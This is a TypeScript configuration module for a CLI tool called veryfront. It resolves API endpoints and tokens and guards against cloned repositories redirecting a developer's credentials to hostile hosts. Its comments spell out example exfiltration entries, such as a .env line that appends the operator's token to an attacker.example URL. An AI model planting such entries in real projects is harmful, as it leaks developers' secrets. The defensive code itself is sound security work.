/**
 * Shared CLI configuration for pull/push commands
 *
 * Handles API URL, authentication tokens, and project resolution.
 * @module cli/shared/config
 */

import { defineSchema, lazySchema } from "veryfront/schemas";
import type { InferSchema } from "veryfront/extensions/schema";
import { basename, join } from "veryfront/platform/path";
import { createFileSystem, cwd, getEnv } from "veryfront/platform";
import { type EnvironmentConfig, getApiTokenEnv, getEnvironmentConfig } from "veryfront/config";
import { getEnvSource } from "veryfront/utils/env-loader";
import { cliLogger, VERSION } from "#cli/utils";
import { readToken } from "../auth/token-store.ts";
import { ensureAuthenticated } from "../auth/login.ts";
import {
  type ApiUrlEnvKey,
  DEFAULT_API_URL,
  isSameApiEndpoint,
  resolveCliApiUrl,
  resolveCliApiUrlWithOrigin,
} from "./constants.ts";
import { sanitizeUrlCredentials } from "veryfront/utils";
import { readProjectLinkForControlPlane } from "./project-link.ts";
import { isConnectionRefusedError, isRetryableConnectionError } from "../../src/proxy/retry.ts";

// Delays for exponential backoff with jitter: attempt 1 = ~300ms, 2 = ~1s, 3 = ~3s
const API_RETRY_DELAYS_MS = [300, 1000, 3000] as const;
const API_MAX_RETRIES = 3;

/** Returns true for HTTP status codes that indicate a transient gateway failure. */
function isTransientStatus(status: number): boolean {
  return status === 502 || status === 503 || status === 504;
}

/**
 * Classify failures from an idempotent API read conservatively.
 *
 * A structured HTTP status is authoritative: authentication, validation, and
 * other client failures must not become retryable merely because an attached
 * cause resembles a connection error.
 */
export function isRetryableApiReadError(error: unknown): boolean {
  const status = typeof error === "object" && error !== null
    ? (error as { status?: unknown }).status
    : undefined;
  return typeof status === "number" ? isTransientStatus(status) : isRetryableConnectionError(error);
}

/** Sleep for `ms` milliseconds plus a random jitter up to 20% of `ms`. */
function sleepWithJitter(ms: number): Promise<void> {
  const jitter = Math.floor(ms * 0.2 * Math.random());
  return new Promise<void>((resolve) => setTimeout(resolve, ms + jitter));
}

export const getVeryfrontConfigSchema = defineSchema((v) =>
  v.object({
    projectSlug: v.string().optional(),
    /** List of project slugs for multi-project pull */
    projects: v.array(v.string()).optional(),
    apiToken: v.string().optional(),
    apiUrl: v.string().optional(),
  })
);
export const VeryfrontConfigSchema = lazySchema(getVeryfrontConfigSchema);
export type VeryfrontConfig = InferSchema<ReturnType<typeof getVeryfrontConfigSchema>>;

export const getResolvedConfigSchema = defineSchema((v) =>
  v.object({
    apiUrl: v.string(),
    apiToken: v.string(),
    apiTokenSource: v.enum(["env", "env-file", "config-file", "token-store"]).optional(),
    projectSlug: v.string(),
    projectId: v.string().optional(),
  })
);
export const ResolvedConfigSchema = lazySchema(getResolvedConfigSchema);
export type ResolvedConfig = InferSchema<ReturnType<typeof getResolvedConfigSchema>>;
export type ApiTokenSource = NonNullable<ResolvedConfig["apiTokenSource"]>;

export interface ApiCredentialCandidate {
  apiToken: string;
  apiTokenSource: ApiTokenSource;
  validationEnv: EnvironmentConfig;
  authoritative: boolean;
}

interface ConfigFileResolution {
  config: VeryfrontConfig | null;
  jsonProjectSlug?: string;
  moduleProjectSlug?: string;
  moduleProjectSlugFile?: string;
}

export type ProjectReferenceSource =
  | { kind: "argument"; name: "--project" }
  | { kind: "environment"; name: "environment configuration" }
  | { kind: "module-config"; name: string }
  | { kind: "json-config"; name: "veryfront.json" }
  | { kind: "tenant-environment"; name: string }
  | { kind: "local-link"; name: ".veryfront/project.json" }
  | { kind: "inferred"; name: "project files" };

export interface ResolvedConfigDetails {
  config: ResolvedConfig;
  projectReferenceSource: ProjectReferenceSource;
}

export const ENVIRONMENT_PROJECT_REFERENCE_NAMES = [
  "VERYFRONT_PROJECT_SLUG",
  "TENANT_PROJECT_SLUG",
  "VERYFRONT_PROJECT_ID",
  "TENANT_PROJECT_ID",
] as const;

export type EnvironmentProjectReferenceName = typeof ENVIRONMENT_PROJECT_REFERENCE_NAMES[number];

async function readConfigFileResolution(projectDir: string): Promise<ConfigFileResolution> {
  const fs = createFileSystem();

  let moduleProjectSlug: string | undefined;
  let moduleProjectSlugFile: string | undefined;
  for (const ext of [".ts", ".js"]) {
    const configPath = join(projectDir, `veryfront.config${ext}`);

    try {
      if (!(await fs.exists(configPath))) continue;

      const module = await import(`file://${configPath}`);
      const config = module.default ?? module;

      if (config?.projectSlug) {
        moduleProjectSlug = config.projectSlug;
        moduleProjectSlugFile = `veryfront.config${ext}`;
        break;
      }
    } catch (error) {
      cliLogger.debug(`Failed to import config file ${configPath}:`, error);
    }
  }

  // veryfront.json is always merged in: veryfront.config.ts owns the
  // projectSlug when both define one, but apiUrl/apiToken only live in
  // veryfront.json and must not be dropped because a TS config exists.
  const jsonConfig = await readConfigJsonFile(projectDir);

  const config = !moduleProjectSlug && !jsonConfig ? null : {
    ...jsonConfig,
    ...(moduleProjectSlug ? { projectSlug: moduleProjectSlug } : {}),
  };
  return {
    config,
    jsonProjectSlug: jsonConfig?.projectSlug,
    moduleProjectSlug,
    moduleProjectSlugFile,
  };
}

export async function readConfigFile(projectDir: string): Promise<VeryfrontConfig | null> {
  return (await readConfigFileResolution(projectDir)).config;
}

export async function readConfigJsonFile(projectDir: string): Promise<VeryfrontConfig | null> {
  const fs = createFileSystem();
  const configJsonPath = join(projectDir, "veryfront.json");

  try {
    if (await fs.exists(configJsonPath)) {
      const content = await fs.readTextFile(configJsonPath);
      const parsed = VeryfrontConfigSchema.safeParse(JSON.parse(content));
      return parsed.success ? parsed.data : null;
    }
  } catch (error) {
    cliLogger.debug(`Failed to read veryfront.json:`, error);
  }

  return null;
}

export async function writeProjectSlug(projectDir: string, slug: string): Promise<void> {
  const fs = createFileSystem();
  const configJsonPath = join(projectDir, "veryfront.json");

  let existing: VeryfrontConfig = {};
  try {
    const content = await fs.readTextFile(configJsonPath);
    const parsed = VeryfrontConfigSchema.safeParse(JSON.parse(content));
    if (parsed.success) existing = parsed.data;
  } catch { /* file doesn't exist yet */ }

  existing.projectSlug = slug;
  await fs.writeTextFile(configJsonPath, JSON.stringify(existing, null, 2) + "\n");
}

function slugify(value: string): string {
  return value.replace(/[^a-z0-9-]/gi, "-");
}

async function inferProjectSlug(projectDir: string): Promise<string | null> {
  const fs = createFileSystem();
  const packagePath = join(projectDir, "package.json");

  try {
    if (await fs.exists(packagePath)) {
      const content = await fs.readTextFile(packagePath);
      const pkg = JSON.parse(content) as { name?: string };
      const name = pkg.name?.replace(/^@[^/]+\//, "");
      if (name) return slugify(name);
    }
  } catch (error) {
    cliLogger.debug("Failed to read package.json for project slug:", error);
  }

  const dirName = projectDir.split(/[/\\]/).pop();
  return dirName ? slugify(dirName) : null;
}

export function resolveEnvironmentProjectReference():
  | { reference: string; name: EnvironmentProjectReferenceName }
  | undefined {
  for (const name of ENVIRONMENT_PROJECT_REFERENCE_NAMES) {
    const reference = getEnv(name);
    if (reference) return { reference, name };
  }
  return undefined;
}

/**
 * How the effective API host was chosen, and whether the repository chose it.
 *
 * `repositorySteered` is true when files that ship with a clone (`veryfront.json`
 * or a project `.env` file) moved the CLI off the endpoint it would otherwise
 * have used. Those files are attacker-controlled for any repository the
 * developer did not write, so ambient credentials must not follow them.
 */
export interface ApiUrlTrust {
  apiUrl: string;
  repositorySteered: boolean;
  /** Set when a project `.env` file supplied the host; the file that did. */
  steeringEnvFile?: string;
  /** Set when a project `.env` file supplied the host; the variable it set. */
  steeringEnvKey?: ApiUrlEnvKey;
}

/** Classify the effective API URL and who chose it. */
export function resolveApiUrlTrust(
  env: EnvironmentConfig,
  configFile: VeryfrontConfig | null,
): ApiUrlTrust {
  const { apiUrl, origin } = resolveCliApiUrlWithOrigin(env, configFile?.apiUrl);

  if (origin.source === "env") {
    // The same variable means different things depending on where it was read.
    // Set in the operator's own shell it confirms the host; read out of a
    // project `.env` file it is just more repository content.
    const source = getEnvSource(origin.key);
    // Naming the endpoint the CLI would have used anyway, in any equivalent
    // spelling, steers nothing. Comparing against the resolved URL would be
    // circular here because the env file supplied it, so the comparison is
    // against the default endpoint, which is what the CLI falls back to once
    // the repository's own inputs are set aside.
    if (source.source === "env-file" && !isSameApiEndpoint(apiUrl, DEFAULT_API_URL)) {
      return {
        apiUrl,
        repositorySteered: true,
        steeringEnvFile: source.file,
        steeringEnvKey: origin.key,
      };
    }
    return { apiUrl, repositorySteered: false };
  }

  if (origin.source !== "config-file") return { apiUrl, repositorySteered: false };

  // A config file that names the endpoint the CLI would have used anyway, in
  // any equivalent spelling, steers nothing.
  return {
    apiUrl,
    repositorySteered: !isSameApiEndpoint(apiUrl, resolveCliApiUrl(env)),
  };
}

/**
 * Raised when a repository-supplied API host would receive a credential the
 * repository did not also supply.
 */
export class UntrustedApiUrlCredentialError extends Error {
  override readonly name = "UntrustedApiUrlCredentialError";
}

/** True for the refusal above, which callers must never fall back around. */
export function isUntrustedApiUrlCredentialError(error: unknown): boolean {
  return error instanceof UntrustedApiUrlCredentialError ||
    (error instanceof Error && error.name === "UntrustedApiUrlCredentialError");
}

/** Below this length a "secret" would match too much ordinary text to redact. */
const MIN_REDACTABLE_SECRET_LENGTH = 8;

/**
 * Reduce a repository-supplied URL to the part worth showing the developer.
 *
 * The origin keeps the protocol and host that identify the redirect and drops
 * userinfo, path, query, and fragment, which is where an expanded credential
 * lands.
 */
function toDisplayApiUrl(apiUrl: string): string {
  try {
    const { origin } = new URL(apiUrl);
    if (origin !== "null") return origin;
  } catch {
    // Fall through: an unparseable URL still gets userinfo stripped below.
  }
  return sanitizeUrlCredentials(apiUrl);
}

/** Replace any ambient credential still visible in `text` with a placeholder. */
function redactAmbientSecrets(text: string, secrets: readonly string[]): string {
  let redacted = text;
  for (const secret of secrets) {
    if (secret.length < MIN_REDACTABLE_SECRET_LENGTH) continue;
    redacted = redacted.split(secret).join("<REDACTED>");
  }
  return redacted;
}

/** Every ambient credential that must never be echoed back to the developer. */
async function collectAmbientSecrets(env: EnvironmentConfig): Promise<string[]> {
  const secrets: string[] = [];
  if (env.apiToken) secrets.push(env.apiToken);
  const storedToken = await readToken(env);
  if (storedToken) secrets.push(storedToken);
  return secrets;
}

/**
 * Explain the refusal to the developer running the command.
 *
 * The URL is repository content, so only its origin is shown and userinfo is
 * stripped before it reaches terminal output, `--json` payloads, or CI logs.
 * A project `.env` value is variable-expanded as it loads, so an entry such as
 * `VERYFRONT_API_URL=https://attacker.example/$VERYFRONT_API_TOKEN` carries the
 * operator's real shell token into the URL. Any ambient credential still
 * visible after that reduction is replaced with `<REDACTED>`. Only the env
 * file's name is shown, never its path on this machine.
 *
 * Because the shown URL is the origin alone, it is never offered as a value to
 * copy into `VERYFRONT_API_URL`: a self-hosted endpoint such as
 * `https://control.example/api` needs its base path, and assigning the bare
 * origin would send every request to the wrong path. The message names the
 * variable and leaves the exact endpoint to the developer, who knows it.
 */
function describeUntrustedApiUrl(trust: ApiUrlTrust, ambientSecrets: readonly string[]): string {
  const safeApiUrl = redactAmbientSecrets(toDisplayApiUrl(trust.apiUrl), ambientSecrets);
  const steer = trust.steeringEnvFile === undefined
    ? `veryfront.json sets apiUrl to ${safeApiUrl}`
    : `The project ${
      basename(trust.steeringEnvFile)
    } file sets ${trust.steeringEnvKey} to ${safeApiUrl}`;

  return `${steer}. Veryfront does not send credentials from your shell environment or ` +
    `'veryfront login' to that host. Add a matching apiToken to veryfront.json, or, if you ` +
    `trust ${safeApiUrl}, set VERYFRONT_API_URL in your shell to that API endpoint, including ` +
    `any base path it needs, to confirm this API host.`;
}

/**
 * True when `candidate` may be sent to a repository-steered host.
 *
 * Only credentials the same repository supplied qualify: a `veryfront.json`
 * `apiToken`, or a token read from the very `.env` file that named the host.
 * A shell token, a stored `veryfront login` token, or a token from a different
 * `.env` file belongs to the developer, not to the repository.
 */
function isRepositorySuppliedCredential(
  candidate: ApiCredentialCandidate,
  trust: ApiUrlTrust,
): boolean {
  if (candidate.apiTokenSource === "config-file") return true;
  if (candidate.apiTokenSource !== "env-file" || trust.steeringEnvFile === undefined) return false;

  const tokenSource = getEnvSource("VERYFRONT_API_TOKEN");
  if (tokenSource.source !== "env-file" || tokenSource.file !== trust.steeringEnvFile) return false;

  // `loadEnv` expands `$NAME` against the real process environment, so an entry
  // such as `VERYFRONT_API_TOKEN=$GITHUB_TOKEN` looks like it came from the
  // file while its value is the operator's shell secret. The repository chose
  // which secret to name; it never owned the secret itself.
  return !tokenSource.expandedFromProcessEnv;
}

async function resolveApiTokenForMode(
  env: EnvironmentConfig,
  configFile: VeryfrontConfig | null,
  interactive: boolean,
  trust: ApiUrlTrust,
): Promise<{ apiToken: string | null; apiTokenSource?: ApiTokenSource }> {
  const candidates = await resolveApiCredentialCandidates(env, configFile, interactive, env);
  // A repository-steered apiUrl must never receive credentials the repository
  // did not also supply: pairing it with a shell, stored-login, or unrelated
  // .env token would let a cloned repository exfiltrate the developer's
  // Veryfront credential to an attacker-controlled host.
  const eligible = trust.repositorySteered
    ? candidates.filter((entry) => isRepositorySuppliedCredential(entry, trust))
    : candidates;
  const [candidate] = eligible;
  if (candidate) {
    return {
      apiToken: candidate.apiToken,
      apiTokenSource: candidate.apiTokenSource,
    };
  }

  return { apiToken: null };
}

async function resolveApiCredentialCandidates(
  env: EnvironmentConfig,
  configFile: VeryfrontConfig | null,
  interactive: boolean,
  validationEnv: EnvironmentConfig,
): Promise<ApiCredentialCandidate[]> {
  const envToken = env.apiToken;
  const envSource = envToken ? getEnvSource("VERYFRONT_API_TOKEN") : { source: "unset" as const };
  const storedToken = await readToken(env);
  const candidates: ApiCredentialCandidate[] = [];

  const shellEnvToken = envToken && envSource.source !== "env-file";
  const projectEnvTokenAfterStored = interactive && envToken && envSource.source === "env-file" &&
    storedToken;

  if (shellEnvToken) {
    candidates.push({
      apiToken: envToken,
      apiTokenSource: "env",
      validationEnv,
      authoritative: true,
    });
  }

  if (configFile?.apiToken) {
    candidates.push({
      apiToken: configFile.apiToken,
      apiTokenSource: "config-file",
      validationEnv,
      authoritative: true,
    });
  }

  if (projectEnvTokenAfterStored) {
    candidates.push({
      apiToken: storedToken,
      apiTokenSource: "token-store",
      validationEnv,
      authoritative: false,
    });
  }

  if (envToken && !shellEnvToken) {
    candidates.push({
      apiToken: envToken,
      apiTokenSource: envSource.source === "env-file" ? "env-file" : "env",
      validationEnv,
      authoritative: envSource.source !== "env-file",
    });
  }

  if (storedToken && !projectEnvTokenAfterStored) {
    candidates.push({
      apiToken: storedToken,
      apiTokenSource: "token-store",
      validationEnv,
      authoritative: false,
    });
  }

  return candidates;
}

export async function resolveApiCredentialCandidatesForAuth(
  env: EnvironmentConfig = getEnvironmentConfig(),
  projectDir: string = cwd(),
  interactive = true,
): Promise<ApiCredentialCandidate[]> {
  const configFile = await readConfigJsonFile(projectDir);
  const trust = resolveApiUrlTrust(env, configFile);
  const validationEnv = { ...env, apiUrl: trust.apiUrl };

  const candidates = await resolveApiCredentialCandidates(
    env,
    configFile,
    interactive,
    validationEnv,
  );

  // `login`, `whoami`, and `up` validate a candidate by sending it to
  // `validationEnv.apiUrl`, so these preflights reach the repository-supplied
  // host before any call to `resolveConfig`. They need the same rule: a
  // repository-steered host may only receive credentials the repository itself
  // supplied, never a shell, stored-login, or unrelated .env token.
  if (!trust.repositorySteered) return candidates;
  return candidates.filter((entry) => isRepositorySuppliedCredential(entry, trust));
}

/**
 * Refuse to mint a new credential for a host a project `.env` file chose.
 *
 * `login` and `ensureAuthenticated` validate a freshly obtained token against
 * `env`, whose `apiUrl` is whatever `VERYFRONT_API_URL` holds, and `loadEnv`
 * fills that variable from a cloned `.env` before any command runs. Filtering
 * the preflight candidates does not cover this: a brand new token is by
 * definition the developer's own, so an empty candidate list must stop the
 * login rather than fall through to one. A `veryfront.json` `apiUrl` does not
 * reach `env`, so only the env-file case is a live path here.
 */
export async function assertApiUrlAcceptsNewCredential(
  env: EnvironmentConfig = getEnvironmentConfig(),
  projectDir: string = cwd(),
): Promise<void> {
  const configFile = await readConfigJsonFile(projectDir);
  const trust = resolveApiUrlTrust(env, configFile);
  if (!trust.repositorySteered || trust.steeringEnvFile === undefined) return;

  throw new UntrustedApiUrlCredentialError(
    describeUntrustedApiUrl(trust, await collectAmbientSecrets(env)),
  );
}

/**
 * Pick the API host and a credential it may receive, for callers that rebuild
 * a configuration outside `resolveConfig`.
 *
 * `pull` reconstructs a config in its `catch` when `--slug` or a `projects`
 * list is in play. Checking only for `UntrustedApiUrlCredentialError` there is
 * not enough: when `veryfront.json` pairs an attacker `apiUrl` with its own
 * `apiToken` the resolver accepts that pairing, so a later project-link failure
 * is an ordinary error, and rebuilding with `getApiTokenEnv(env)` would swap
 * the repository's token for the developer's and send it to that host. This
 * applies the same trust rule to the rebuild, and refuses when nothing the
 * repository supplied is available.
 */
export async function resolveApiCredentialForFallback(
  env: EnvironmentConfig,
  configFile: VeryfrontConfig | null,
): Promise<{ apiUrl: string; apiToken: string | null }> {
  const trust = resolveApiUrlTrust(env, configFile);
  const candidates: ApiCredentialCandidate[] = [];

  // Same precedence the fallbacks used before: the environment token first,
  // then the veryfront.json apiToken.
  const envToken = getApiTokenEnv(env);
  if (envToken) {
    const envSource = getEnvSource("VERYFRONT_API_TOKEN");
    candidates.push({
      apiToken: envToken,
      apiTokenSource: envSource.source === "env-file" ? "env-file" : "env",
      validationEnv: env,
      authoritative: envSource.source !== "env-file",
    });
  }
  if (configFile?.apiToken) {
    candidates.push({
      apiToken: configFile.apiToken,
      apiTokenSource: "config-file",
      validationEnv: env,
      authoritative: true,
    });
  }

  const eligible = trust.repositorySteered
    ? candidates.filter((entry) => isRepositorySuppliedCredential(entry, trust))
    : candidates;

  const [candidate] = eligible;
  if (!candidate && trust.repositorySteered) {
    throw new UntrustedApiUrlCredentialError(
      describeUntrustedApiUrl(trust, await collectAmbientSecrets(env)),
    );
  }

  return { apiUrl: trust.apiUrl, apiToken: candidate?.apiToken ?? null };
}

async function resolveConfigBase(
  projectDir: string | undefined,
  env: EnvironmentConfig,
  interactive: boolean,
): Promise<ResolvedConfigDetails> {
  const dir = projectDir ?? cwd();
  const configFileResolution = await readConfigFileResolution(dir);
  const configFile = configFileResolution.config;

  const trust = resolveApiUrlTrust(env, configFile);
  const apiUrl = trust.apiUrl;

  let { apiToken, apiTokenSource } = await resolveApiTokenForMode(
    env,
    configFile,
    interactive,
    trust,
  );

  if (!apiToken && trust.repositorySteered) {
    throw new UntrustedApiUrlCredentialError(
      describeUntrustedApiUrl(trust, await collectAmbientSecrets(env)),
    );
  }

  if (!apiToken && interactive) {
    const userInfo = await ensureAuthenticated(env, dir);
    if (!userInfo) throw new Error("Authentication required for this operation.");
    apiToken = (await readToken(env)) ?? null;
    apiTokenSource = apiToken ? "token-store" : undefined;
    if (!apiToken) throw new Error("Authentication failed. Please try again.");
  }

  if (!apiToken) {
    throw new Error(
      "Missing API token. Run 'veryfront login' or set VERYFRONT_API_TOKEN environment variable",
    );
  }

  let projectSlug: string | null | undefined;
  let projectId: string | undefined;
  let projectReferenceSource: ProjectReferenceSource;
  if (env.projectSlug !== undefined) {
    projectSlug = env.projectSlug;
    projectReferenceSource = { kind: "environment", name: "environment configuration" };
  } else if (configFileResolution.moduleProjectSlug !== undefined) {
    projectSlug = configFileResolution.moduleProjectSlug;
    projectReferenceSource = {
      kind: "module-config",
      name: configFileResolution.moduleProjectSlugFile ?? "veryfront.config.ts",
    };
  } else if (configFileResolution.jsonProjectSlug !== undefined) {
    projectSlug = configFileResolution.jsonProjectSlug;
    projectReferenceSource = { kind: "json-config", name: "veryfront.json" };
  } else {
    const tenantReference = resolveEnvironmentProjectReference();
    if (tenantReference) {
      projectSlug = tenantReference.reference;
      if (
        tenantReference.name === "VERYFRONT_PROJECT_ID" ||
        tenantReference.name === "TENANT_PROJECT_ID"
      ) {
        projectId = tenantReference.reference;
      }
      projectReferenceSource = { kind: "tenant-environment", name: tenantReference.name };
    } else {
      const projectLink = await readProjectLinkForControlPlane(dir, apiUrl);
      if (projectLink) {
        projectSlug = projectLink.projectSlug;
        projectId = projectLink.projectId;
        projectReferenceSource = { kind: "local-link", name: ".veryfront/project.json" };
      } else {
        projectSlug = await inferProjectSlug(dir);
        projectReferenceSource = { kind: "inferred", name: "project files" };
      }
    }
  }
  if (!projectSlug) {
    throw new Error(
      "Could not determine project reference. Set VERYFRONT_PROJECT_SLUG, TENANT_PROJECT_SLUG, VERYFRONT_PROJECT_ID, or add projectSlug to veryfront.config.ts",
    );
  }

  return {
    config: {
      apiUrl,
      apiToken,
      ...(apiTokenSource ? { apiTokenSource } : {}),
      projectSlug,
      ...(projectId ? { projectId } : {}),
    },
    projectReferenceSource,
  };
}

function createConfigResolver(interactive: boolean) {
  return async (projectDir?: string, env?: EnvironmentConfig): Promise<ResolvedConfig> =>
    (await resolveConfigByMode(projectDir, env, interactive)).config;
}

export const resolveConfig = createConfigResolver(false);

/**
 * Resolve config with interactive authentication.
 *
 * If no token is available, prompts the user to login interactively.
 * Use this for commands that require authentication (push, pull, deploy).
 */
export const resolveConfigWithAuth = createConfigResolver(true);

export function resolveConfigWithAuthDetails(
  projectDir?: string,
  env?: EnvironmentConfig,
): Promise<ResolvedConfigDetails> {
  return resolveConfigByMode(projectDir, env, true);
}

function resolveConfigByMode(
  projectDir: string | undefined,
  env: EnvironmentConfig | undefined,
  interactive: boolean,
): Promise<ResolvedConfigDetails> {
  return resolveConfigBase(projectDir, env ?? getEnvironmentConfig(), interactive);
}

export interface ApiReadOptions {
  /** Abort the in-flight HTTP request when this signal fires. */
  signal?: AbortSignal;
  /** Use `none` when a caller owns retry timing or replaying a write would be ambiguous. */
  retryPolicy?: "default" | "none";
}

export interface ApiClient {
  get<T>(
    path: string,
    params?: Record<string, string>,
    options?: ApiReadOptions,
  ): Promise<T>;
  post<T>(path: string, body?: unknown): Promise<T>;
  put<T>(path: string, body?: unknown, options?: ApiReadOptions): Promise<T>;
  patch<T>(path: string, body?: unknown): Promise<T>;
  delete<T>(path: string): Promise<T>;
}

export const getApiErrorSchema = defineSchema((v) =>
  v.object({
    error: v.string().optional(),
    message: v.string().optional(),
    detail: v.string().optional(),
    title: v.string().optional(),
    suggestion: v.string().optional(),
    code: v.string().optional(),
    slug: v.string().optional(),
  })
);
export const ApiErrorSchema = lazySchema(getApiErrorSchema);
export type ApiError = InferSchema<ReturnType<typeof getApiErrorSchema>>;

export function formatApiError(data: ApiError, fallback: string): string {
  const message = data.message || data.detail || data.error || data.title || fallback;
  return data.suggestion ? `${message.replace(/[.?!]+$/, "")}. ${data.suggestion}` : message;
}

export function createApiClient(config: ResolvedConfig): ApiClient {
  const { apiUrl, apiToken } = config;

  function addTokenSourceHint(message: string, status: number): string {
    if (config.apiTokenSource !== "env-file") return message;
    if (status !== 401 && status !== 403 && status !== 404) return message;

    return `${message}. VERYFRONT_API_TOKEN was loaded from a project .env file. For management commands, run 'veryfront login' and remove or rename the project runtime token, or pass a management token explicitly in the shell.`;
  }

  async function requestOnce<T>(
    method: string,
    url: string,
    body?: unknown,
    signal?: AbortSignal,
  ): Promise<T> {
    const response = await fetch(url, {
      method,
      ...(signal ? { signal } : {}),
      headers: {
        Authorization: `Bearer ${apiToken}`,
        "Content-Type": "application/json",
        Accept: "application/json",
        "x-veryfront-client-version": VERSION,
      },
      body: body ? JSON.stringify(body) : undefined,
    });

    if (!response.ok) {
      let errorMessage = `API request failed: ${response.status} ${response.statusText}`;

      try {
        const parsed = ApiErrorSchema.safeParse(await response.json());
        if (parsed.success) {
          errorMessage = formatApiError(parsed.data, errorMessage);
        }
      } catch {
        // Keep default error message if JSON parsing fails
      }

      errorMessage = addTokenSourceHint(errorMessage, response.status);
      const err = new Error(errorMessage) as Error & { status: number };
      err.status = response.status;
      throw err;
    }

    if (response.status === 204) return undefined as T;

    return response.json() as Promise<T>;
  }

  /** Returns true for request methods that are safe to retry on any transient failure. */
  function isIdempotent(method: string): boolean {
    return method === "GET" || method === "HEAD" || method === "PUT";
  }

  async function request<T>(
    method: string,
    path: string,
    body?: unknown,
    params?: Record<string, string>,
    options: ApiReadOptions = {},
  ): Promise<T> {
    const url = new URL(`${apiUrl}${path}`);

    for (const [key, value] of Object.entries(params ?? {})) {
      url.searchParams.set(key, value);
    }

    const urlStr = url.toString();
    let lastError: unknown;
    const maxAttempts = options.retryPolicy === "none" ? 1 : API_MAX_RETRIES;

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      try {
        return await requestOnce<T>(method, urlStr, body, options.signal);
      } catch (error) {
        lastError = error;

        const isRefused = isConnectionRefusedError(error);

        // Idempotent: retry on transient HTTP status or status-less retryable connection errors.
        // Non-idempotent: retry only on connection-refused (request never reached server).
        const shouldRetry = isIdempotent(method) ? isRetryableApiReadError(error) : isRefused;

        if (!shouldRetry || attempt >= maxAttempts - 1) {
          throw error;
        }

        await sleepWithJitter(API_RETRY_DELAYS_MS[attempt as 0 | 1 | 2]);
        cliLogger.debug(
          `API request ${method} ${path} failed (attempt ${attempt + 1}), retrying...`,
          error,
        );
      }
    }

    throw lastError;
  }

  return {
    get<T>(
      path: string,
      params?: Record<string, string>,
      options?: ApiReadOptions,
    ): Promise<T> {
      return request<T>("GET", path, undefined, params, options);
    },
    post<T>(path: string, body?: unknown): Promise<T> {
      return request<T>("POST", path, body);
    },
    put<T>(path: string, body?: unknown, options?: ApiReadOptions): Promise<T> {
      return request<T>("PUT", path, body, undefined, options);
    },
    patch<T>(path: string, body?: unknown): Promise<T> {
      return request<T>("PATCH", path, body);
    },
    delete<T>(path: string): Promise<T> {
      return request<T>("DELETE", path);
    },
  };
}
